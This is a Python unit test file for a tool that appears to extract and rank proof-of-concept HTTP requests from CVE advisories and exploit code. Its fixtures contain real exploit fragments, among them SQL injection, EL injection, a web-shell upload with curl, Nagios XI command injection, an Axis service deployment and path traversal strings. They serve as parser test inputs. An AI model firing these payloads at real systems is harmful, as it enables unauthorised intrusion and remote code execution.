import unittest

from cve_hunter.poc_parser import (
    build_multistep_http_candidate,
    extract_http_requests,
    parse_poc_candidates_json,
    render_raw_http,
    score_evidence_request,
)


class PoCParserTests(unittest.TestCase):
    def test_render_structured_candidate(self):
        raw = render_raw_http({
            "method": "POST",
            "path": "/api/login",
            "headers": {"Host": "example.com", "Content-Type": "application/json"},
            "body": '{"username":"admin"}',
        })

        self.assertIn("POST /api/login HTTP/1.1", raw)
        self.assertIn("Host: {{TARGET_HOST}}", raw)
        self.assertIn("Content-Type: application/json", raw)
        self.assertIn('{"username":"admin"}', raw)

    def test_parse_json_candidates_object(self):
        text = """
        {
          "candidates": [
            {
              "method": "GET",
              "path": "/debug",
              "headers": {"Host": "{{TARGET_HOST}}"},
              "evidence_url": "https://example.com/advisory",
              "confidence": 0.8,
              "reason": "documented path"
            }
          ]
        }
        """

        candidates = parse_poc_candidates_json(text)

        self.assertEqual(len(candidates), 1)
        self.assertIn("GET /debug HTTP/1.1", candidates[0]["raw_http"])
        self.assertEqual(candidates[0]["evidence_url"], "https://example.com/advisory")
        self.assertEqual(candidates[0]["confidence"], 0.8)

    def test_parse_fenced_json_candidates(self):
        text = """```json
{"candidates":[{"method":"GET","path":"/poc","headers":{"Host":"{{TARGET_HOST}}"}}]}
```"""

        candidates = parse_poc_candidates_json(text)

        self.assertEqual(len(candidates), 1)
        self.assertIn("GET /poc HTTP/1.1", candidates[0]["raw_http"])

    def test_parse_raw_http_candidate_json(self):
        text = {
            "raw_http": "GET /legacy HTTP/1.1\nHost: {{TARGET_HOST}}\n\n",
            "confidence": "0.7",
        }

        candidates = parse_poc_candidates_json(str(text).replace("'", '"'))

        self.assertEqual(len(candidates), 1)
        self.assertIn("GET /legacy HTTP/1.1", candidates[0]["raw_http"])
        self.assertEqual(candidates[0]["confidence"], 0.7)

    def test_extract_multiple_raw_http_code_blocks(self):
        text = """```http
GET /one HTTP/1.1
Host: {{TARGET_HOST}}

```

```http
POST /two HTTP/1.1
Host: {{TARGET_HOST}}

body
```"""

        requests = extract_http_requests(text)

        self.assertEqual(len(requests), 2)
        self.assertIn("GET /one HTTP/1.1", requests[0])
        self.assertIn("POST /two HTTP/1.1", requests[1])

    def test_extract_raw_http_dedupes(self):
        text = """GET /same HTTP/1.1
Host: {{TARGET_HOST}}

GET /same HTTP/1.1
Host: {{TARGET_HOST}}

"""

        requests = extract_http_requests(text)

        self.assertEqual(len(requests), 1)

    def test_parse_preserves_ordered_request_steps_and_encoding(self):
        text = '{"candidates":[{"request_steps":[{"method":"GET","path":"/cgi-bin/a%00"},{"raw_http":"POST /next?x=..%2f HTTP/1.1\\nHost: {{TARGET_HOST}}\\n\\nbody"}],"evidence_quote":"/cgi-bin/a%00","encoding_preserved":true}]}'
        candidate = parse_poc_candidates_json(text)[0]
        self.assertEqual(len(candidate["request_steps"]), 2)
        self.assertIn("/cgi-bin/a%00", candidate["request_steps"][0]["raw_http"])
        self.assertIn("..%2f", candidate["request_steps"][1]["raw_http"])
        self.assertTrue(candidate["encoding_preserved"])

    def test_extracts_curl_and_python_http_calls(self):
        text = '''curl -X POST "http://example.test/cgi-bin/a?x=%00" -H "X-Test: yes" --data-raw "p=../"\nrequests.get("http://example.test/cgi-bin/b?z=1")'''
        requests = extract_http_requests(text)
        self.assertTrue(any("POST /cgi-bin/a?x=%00 HTTP/1.1" in item and "p=../" in item for item in requests))
        self.assertTrue(any("GET /cgi-bin/b?z=1 HTTP/1.1" in item for item in requests))

    def test_extract_bare_advisory_url_and_rank_by_cve_section(self):
        text = """
CVE-2018-15710: Command Injection

```
https://192.168.1.208/nagiosxi/ajaxhelper.php?cmd=submitcommand&opts={%22cmd%22:1100}&nsp=aaa
```

CVE-2018-15711: Unauthorized API Key Regeneration

```
https://192.168.1.208/nagiosxi/ajaxhelper.php?cmd=getxicoreajax&opts={%22func%22:%22set_random_api_key%22,%22args%22:{%22user_id%22:1}}&nsp=bbb
```
"""
        requests = extract_http_requests(text)
        self.assertTrue(any("set_random_api_key" in item for item in requests))
        target = next(item for item in requests if "set_random_api_key" in item)
        sibling = next(item for item in requests if "submitcommand" in item)
        self.assertGreater(
            score_evidence_request(target, cve_id="CVE-2018-15711", source_text=text),
            score_evidence_request(sibling, cve_id="CVE-2018-15711", source_text=text),
        )

    def test_rejects_unexpanded_python_template_paths(self):
        text = 'self.service_url = f"{self.target}/services/{self.service_name}"\n'
        requests = extract_http_requests(text)
        self.assertFalse(any("{self.service_name}" in item for item in requests))

    def test_extract_payload_label_and_json_dumps_post(self):
        readme = (
            "There is a sql injection via api.php/Cms/search\n"
            "payload:field=1)/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/user()),0x7e),1)#&keyword=title&scode=1\n"
        )
        reqs = extract_http_requests(readme)
        self.assertTrue(any("Cms/search" in item and "updatexml" in item and "field=" in item for item in reqs))

        py = '''
exploit_url = f"{HOST}/service/extdirect"
el_expr = "${7*7}"
inject_data = {
    "action": "coreui_User",
    "method": "update",
    "data": [{"userId": "admin", "roles": [el_expr]}],
    "type": "rpc",
    "tid": 1
}
session.post(exploit_url, headers=inject_headers, data=json.dumps(inject_data))
'''
        posts = extract_http_requests(py)
        self.assertTrue(any(
            item.startswith("POST /service/extdirect") and "coreui_User" in item
            for item in posts
        ))

    def test_extract_argv_path_curl_and_flex_path(self):
        py = (
            "check = urllib.urlencode({'cs_uid': 1, 'action': 'cs_employer_ajax_profile'})\n"
            'requests.post(sys.argv[2] + "/wp-admin/admin-ajax.php", data=check, headers=headers)\n'
        )
        reqs = extract_http_requests(py)
        self.assertTrue(any(
            "POST /wp-admin/admin-ajax.php" in item and "cs_employer_ajax_profile" in item
            for item in reqs
        ))

        curl = '$ curl -F "files=@shell.php" http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php\n'
        creqs = extract_http_requests(curl)
        self.assertTrue(any("POST /server/php/index.php" in item and "multipart" in item.lower() for item in creqs))

        amf = (
            'url = "http://" + target_IP + ":" + target_port + "/flex2gateway/amf"\n'
            "headers = {'Content-Type': 'application/x-amf'}\n"
            "response = requests.post(url, headers=headers, data=amf_payload)\n"
        )
        areqs = extract_http_requests(amf)
        self.assertTrue(any("POST /flex2gateway/amf" in item for item in areqs))

    def test_extract_python_named_payload_post_and_multistep(self):
        text = '''
service_url = f"{self.target}/services/{self.service_name}"
payload = f\'\'\'<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><exec>id</exec></soapenv:Body>
</soapenv:Envelope>\'\'\'
requests.post(self.service_url, data=payload.encode("utf-8"), headers=self.headers)
'''
        text = text.replace("\\'''", "'''")
        # Use real triple quotes in source:
        text = (
            'service_url = f"{self.target}/services/{self.service_name}"\n'
            "payload = f'''<?xml version=\"1.0\"?>\n"
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n'
            "  <soapenv:Body><exec>id</exec></soapenv:Body>\n"
            "</soapenv:Envelope>'''\n"
            'requests.post(self.service_url, data=payload.encode("utf-8"), headers=self.headers)\n'
        )
        requests = extract_http_requests(text)
        self.assertTrue(any(
            item.startswith("POST /services/exploitservice") and "<exec>" in item
            for item in requests
        ))
        deploy = (
            "GET /axis/services/AdminService?method=%21--%3E%3Cns1%3Adeployment HTTP/1.1\n"
            "Host: {{TARGET_HOST}}\n\n"
        )
        multi = build_multistep_http_candidate([deploy, requests[0]])
        self.assertIsNotNone(multi)
        self.assertEqual(len(multi["request_steps"]), 2)


if __name__ == "__main__":
    unittest.main()
